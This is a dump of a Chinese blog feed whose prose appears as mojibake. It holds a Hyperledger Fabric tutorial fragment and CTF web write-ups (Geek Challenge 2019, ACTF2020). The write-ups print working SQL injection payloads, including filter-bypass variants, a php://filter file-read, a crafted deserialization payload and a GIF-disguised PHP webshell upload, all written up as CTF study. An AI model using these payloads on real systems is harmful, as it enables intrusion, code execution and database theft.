<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh createChannel</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>åˆ›å»ºæˆåŠŸï¼Œé»˜è®¤é€šé“åä¸ºmychannel</p>
<p>ä¹Ÿå¯ä»¥å¸¦ä¸Šchannelæ ‡ç­¾ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼ˆ-c ChannelNameï¼‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh createChannel -c name</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœè¦åœ¨ä¸€ä¸ªæ­¥éª¤ä¸­å¯åŠ¨ç½‘ç»œå¹¶åˆ›å»ºé¢‘é“ï¼Œå¯ä»¥åŒæ—¶ä½¿ç”¨upå’Œcreate channelæ¨¡å¼ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh up createChannel</span><br></pre></td></tr></table></figure></div>

<p>2ã€åœ¨é€šé“ä¸Šå¯åŠ¨é“¾ç </p>
<p>ï¼ˆ1ï¼‰ä½¿ç”¨network.shåˆ›å»ºé€šé“ä¹‹åï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨é€šé“ä¸Šå¯åŠ¨é“¾ç ï¼ˆé»˜è®¤ä½¿ç”¨goè¯­è¨€ï¼‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh deployCC</span><br></pre></td></tr></table></figure></div>

<p>åœ¨æ­¤æœŸé—´å¯èƒ½ä¼šé‡åˆ° go get æ— æ³•ä¸‹è½½ï¼ˆå®‰è£…goçš„ä¾èµ–åŒ…çš„æ—¶å€™,é•¿æ—¶é—´æ— å“åº”.</p>
<p>è§£å†³åŠæ³•: ä½¿ç”¨ä¸ƒç‰›äº‘ go module é•œåƒ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°ä¸‹å›¾ï¼Œå¯åŠ¨æˆåŠŸ</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/5.png" src="/img/loading.gif" class="lazyload"></a>

<p>3ã€ä¸ç½‘ç»œäº’åŠ¨</p>
<p>ç½‘ç»œå¯åŠ¨ä¹‹åï¼Œå¯ä»¥ä½¿ç”¨peer cliå®¢æˆ·ç«¯å»æ“ä½œç½‘ç»œï¼Œå¯ä»¥é€šè¿‡cliå®¢æˆ·ç«¯å»è°ƒç”¨éƒ¨ç½²æ™ºèƒ½åˆçº¦ï¼Œæ›´æ–°é€šé“ï¼Œæˆ–è€…å®‰è£…å’Œéƒ¨ç½²æ–°çš„æ™ºèƒ½åˆçº¦ã€‚</p>
<p>æœ¬æ–‡å‚è€ƒï¼š<a href="https://blog.csdn.net/tianshuhao521/article/details/104695687" target="_blank" rel="noopener">tianshuhao521</a>ã€<a href="https://blog.csdn.net/qq_42680655/article/details/105188538" target="_blank" rel="noopener">Yesterjunior</a></p>
]]></content>
      <categories>
        <category>åŒºå—é“¾</category>
      </categories>
      <tags>
        <tag>åŒºå—é“¾</tag>
        <tag>HyperLedger_Fabric</tag>
      </tags>
  </entry>
  <entry>
    <title>æå®¢å¤§æŒ‘æˆ˜_2019</title>
    <url>/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/</url>
    <content><![CDATA[<p>äººå‚»äº†ï¼Œå¼€è¿™ç¯‡åšå®¢ä¹‹å‰ä»¥ä¸ºè¿™å°±æ˜¯åœºæ¶æˆ˜ã€‚ã€‚æ²¡æƒ³åˆ°å‘€ã€‚ã€‚ã€‚å¥½å§è¿˜è¡Œã€‚ã€‚å¥½å¤šSQLã€‚ã€‚ã€‚è€Œä¸”å’‹éƒ½å˜æˆ1åˆ†äº†ã€‚ã€‚</p>
<h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><p>ä¸‡èƒ½å¯†ç ï¼Œç™»å½•å¾—åˆ°flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/1.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h3><p>F12å‘ç°ä¸‹é¢ä»£ç ï¼Œgetä¼ å‚cat=dogå³å¯</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $cat;</span><br><span class="line">        <span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h3><p>302é‡å®šå‘ã€filterä¼ªåè®®</p>
<p>æ‹¿åˆ°é¢˜è·Ÿç€æºä»£ç èµ°ï¼Œå‘ç°æœ‰ä¸ª302ï¼ŒbpæŠ“ä¸€ä¸‹åŒ…</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>è®¿é—®secr3t.phpï¼Œå¾—åˆ°ä»¥ä¸‹æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿‡æ»¤äº†ï¼š../ã€tpã€inputã€dataã€‚å¹¶æç¤ºflagåœ¨flag.phpé‡Œ</p>
<p>æ„é€ ï¼š<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>å¾—åˆ°base64åŠ å¯†åçš„æºç ï¼Œè§£ç åå¾—åˆ°flag</p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p><a href="http://www.zipã€ååºåˆ—åŒ–" target="_blank" rel="noopener">www.zipã€ååºåˆ—åŒ–</a></p>
<p>æç¤ºå¤‡ä»½ç½‘ç«™æƒ³åˆ°bakï¼Œä½†æ˜¯æ²¡æƒ³åˆ°<a href="http://www.zipï¼Œæ‰«ä¸€ä¸‹æ‰å‘ç°ã€‚ã€‚" target="_blank" rel="noopener">www.zipï¼Œæ‰«ä¸€ä¸‹æ‰å‘ç°ã€‚ã€‚</a></p>
<p>è§£å‹å¾—åˆ°ä¸‰ä¸ªæ–‡ä»¶index.phpã€class.phpã€flag.phpï¼Œå‰ä¸¤ä¸ªæœ‰ã€ç”¨ï¼Œflag.phpå°±è¿·æƒ‘ä¸€å“ˆï¼Œå¾—åˆ°ä»¥ä¸‹ä»£ç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">    $select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ååºåˆ—åŒ–ï¼Œæ„é€ å¦‚ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> Name(<span class="string">"admin"</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="comment">//å¾—åˆ°</span></span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A100%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="comment">//ä½†æ˜¯è¿˜è¦ç»•è¿‡__wakeup()æ‰€ä»¥è¦æŠŠåºåˆ—åŒ–åçš„ç±»ä¸­çš„å˜é‡æ•°å˜å¤§ç‚¹</span></span><br></pre></td></tr></table></figure></div>

<p>æœ€åæ„é€ </p>
<p>select=O%3A4%3Aâ€Nameâ€%3A<strong><em>3</em></strong>%3A%7Bs%3A14%3Aâ€%00Name%00usernameâ€%3Bs%3A5%3Aâ€adminâ€%3Bs%3A14%3Aâ€%00Name%00passwordâ€%3Bi%3A100%3B%7Dï¼Œå¾—åˆ°flag</p>
<h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p>ä¸€å¥è¯å·²ç»ç»™å‡ºæ¥äº†ï¼Œæ‹¿èœåˆ€è¿ä¸€ä¸‹æˆ–è€…ç›´æ¥ä¼ å‚è¿›è¡Œå‘½ä»¤æ‰§è¡Œå°±å¥½å•¦ã€‚åœ¨æ ¹ç›®å½•ä¸‹å‘ç°flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>ç„¶åå†<code>cat /flag</code>å°±å¾—åˆ°flagäº†</p>
<h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p>ç®€å•æ³¨å…¥ï¼Œå…ˆç”¨ä¸‡èƒ½å¯†ç ç™»å½•ä¸€ä¸‹ï¼Œç„¶åç”¨orderè¯­å¥æŸ¥è¡¨å‘ç°æœ‰ä¸‰åˆ—</p>
<p>æ²¡æœ‰è¿‡æ»¤ï¼Œsqlmapå°±ä¸è¦æäº†ï¼Œæ‰‹å·¥è”åˆæ³¨ä¸€ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;union select 1,2,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;geek&#39;#</span><br><span class="line">1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;#</span><br><span class="line">1&#39;union select 1,2,group_concat(concat_ws(&#39;~&#39;,username,password)) from geek.l0ve1ysq1#</span><br></pre></td></tr></table></figure></div>

<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>æŸ¥çœ‹æºç å‘ç°<code>Secret.php</code></p>
<p>è®¿é—®åæç¤ºï¼šIt doesnâ€™t come from â€˜<a href="https://www.Sycsecret.com&#39;ï¼ŒåŠ ä¸€ä¸‹Referer:https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com&#39;ï¼ŒåŠ ä¸€ä¸‹Referer:https://www.Sycsecret.com</a></p>
<p>å†æ¬¡è®¿é—®åæç¤ºï¼šPlease use â€œSycloverâ€ browserï¼Œæ”¹ä¸€ä¸‹UA:Syclover</p>
<p>æœ€åè®¿é—®åæç¤ºï¼šNo!!! you can only read this locally!!!ï¼ŒåŠ ä¸€ä¸ªXFF:127.0.0.1</p>
<p>æœ€åè®¿é—®å¾—åˆ°flag</p>
<h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p>é¦–å…ˆå°è¯•ä¸‡èƒ½å¯†ç ï¼Œå‘ç°orè¢«è¿‡æ»¤æ‰ï¼ŒåŒå†™ç»•è¿‡</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>ç™»å½•æˆåŠŸï¼Œå°è¯•è”åˆæ³¨å…¥ï¼Œå‘ç°unionã€selectã€whereã€fromè¢«è¿‡æ»¤</p>
<p>æ³¨å…¥ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; uniounionn selecselectt 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata--+</span><br><span class="line">1&#39; uniounionn selecselectt 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;&#39;geek&#39;--+</span><br><span class="line">1&#39; uniounionn selecselectt 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;--+</span><br><span class="line">1&#39; uniounionn selecselectt 1,2,group_concat(concat_ws(&#39;~&#39;,username,passwoorrd)) frofromm geek.b4bsql--+</span><br></pre></td></tr></table></figure></div>

<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p>æ‰“å¼€ååœ¨menuå‡ºæ‰¾åˆ°buyflagï¼Œè·³è½¬åæŸ¥çœ‹æºä»£ç å‘ç°</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">	$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>

<p>å¹¶ä¸”æœ‰æç¤º<code>Only Cuit&#39;s students can buy the FLAG</code>ï¼ŒçŒœä¸åˆ°æ„é€ ä»€ä¹ˆhttpå¤´ï¼Œæ‰€ä»¥æŠ“åŒ…çœ‹çœ‹</p>
<p>å‘ç°httpå¤´ä¸­Cookieä¸­æœ‰user=0ï¼Œå°†å…¶æ”¹ä¸ºuser=1</p>
<p>ä»¤password=404aï¼Œå³å¯ç»•è¿‡æ•°å­—åˆ¤æ–­ï¼Œä¸‹é¢å¼ºåˆ¶æ¯”è¾ƒæ—¶ä¼šå¼ºåˆ¶è½¬åŒ–ï¼Œæ‰€ä»¥æˆåŠŸç»•è¿‡</p>
<p>ç›´æ¥postï¼Œmoneyæç¤º<code>Nember lenth is too long</code>ï¼Œåˆ©ç”¨strcmpæ¯”è¾ƒæ•°ç»„å’Œå­—ç¬¦æ—¶ä¼šè¿”å›é›¶çš„ç‰¹ç‚¹è¿›è¡Œç»•è¿‡ï¼Œå¾—åˆ°flag</p>
<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>åç¼€æ£€æµ‹ã€æ–‡ä»¶å¤´æ£€æµ‹ã€Content-Typeæ£€æµ‹ã€ä¸Šä¼ æ–‡ä»¶å¤§å°æ£€æµ‹ã€&lt;? æ£€æµ‹</p>
<p>èšå‰‘è¿ä¸Šå»å¾—åˆ°ä¸‹é¢æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_FILES[<span class="string">"file"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…è®¸ä¸Šä¼ çš„å›¾ç‰‡åç¼€</span></span><br><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php2"</span>,<span class="string">"php3"</span>,<span class="string">"php4"</span>,<span class="string">"php5"</span>,<span class="string">"pht"</span>,<span class="string">"phtm"</span>);</span><br><span class="line">$temp = explode(<span class="string">"."</span>, $file[<span class="string">"name"</span>]);</span><br><span class="line">$extension = strtolower(end($temp));        <span class="comment">// è·å–æ–‡ä»¶åç¼€å</span></span><br><span class="line">$image_type = @exif_imagetype($file[<span class="string">"tmp_name"</span>]);</span><br><span class="line"><span class="keyword">if</span> ((($file[<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>)</span><br><span class="line">|| ($file[<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp;$file[<span class="string">"size"</span>] &lt; <span class="number">20480</span>)    <span class="comment">// å°äº 20 kb</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($file[<span class="string">"error"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ERROR!!!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (in_array($extension, $allowedExts)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"NOTï¼"</span>.$extension.<span class="string">"!"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">elseif</span> (mb_strpos(file_get_contents($file[<span class="string">"tmp_name"</span>]), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"NO! HACKER! your file included '&amp;#x3C;&amp;#x3F;'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Don't lie to me, it's not image at all!!!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $fileName=<span class="string">'./upload/'</span>.$file[<span class="string">'name'</span>];</span><br><span class="line">        move_uploaded_file($file[<span class="string">'tmp_name'</span>],$fileName); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ä¸Šä¼ æ–‡ä»¶å: "</span> . $file[<span class="string">"name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Not image!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ç»•è¿‡å§¿åŠ¿ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">GIF89a? &lt;script language&#x3D;&quot;Php&quot;&gt;eval($_REQUEST[pass])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h3><h3 id="FinalSQL"><a href="#FinalSQL" class="headerlink" title="FinalSQL"></a>FinalSQL</h3><h3 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE ME"></a>RCE ME</h3>]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF2020æ–°ç”Ÿèµ›</title>
    <url>/2020/04/13/ACTF2020/</url>
    <content><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h3><p>è¿™ä¸ªé¢˜ä¸»è¦è€ƒç”¨php://filterä¼ªåè®®è¿›è¡Œæ–‡ä»¶åŒ…å«</p>
<p>è¿›å…¥é¢˜ç›®å‘ç°urlä¸­æœ‰?file=flag.phpï¼Œé¦–å…ˆæƒ³åˆ°ç”¨php://ä¼ªåè®®æ¥å‘é€phpä»£ç ï¼Œç„¶åå‘ç°æç¤ºï¼š<code>hacker!</code></p>
<p>ç„¶åå°±æƒ³åˆ°ç”¨php://filteræ¥è¯»å–flag.phpæ–‡ä»¶base64æºç </p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/13/ACTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>base64è§£ç åå¾—åˆ°flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can you find out the flag?"</span>;</span><br><span class="line"><span class="comment">//flag&#123;1d7f32d1-354d-4f5a-b1dd-cd41e002f741&#125;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h3><p>åŸºç¡€çš„å‘½ä»¤æ‰§è¡Œ</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h3><p>å¤‡ä»½æ–‡ä»¶ã€ezbypass</p>
<p>é¢˜ç›®åå­—æç¤ºå·²ç»bakæ–‡ä»¶äº†ï¼Œæˆ‘è¿˜æ˜¯æ‰«äº†ä¸€ä¸‹ã€‚</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¾—åˆ°æºç ï¼š</p>
